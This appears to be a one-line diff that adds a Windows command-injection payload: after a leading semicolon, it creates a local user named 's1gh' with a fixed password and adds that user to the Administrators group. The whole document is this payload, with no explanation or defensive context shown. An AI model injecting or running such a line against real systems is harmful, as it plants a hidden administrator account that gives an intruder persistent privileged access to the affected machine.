@@ -1,0 +1,1 @@
+;net user s1gh Password1234! /add;net localgroup Administrators s1gh /add
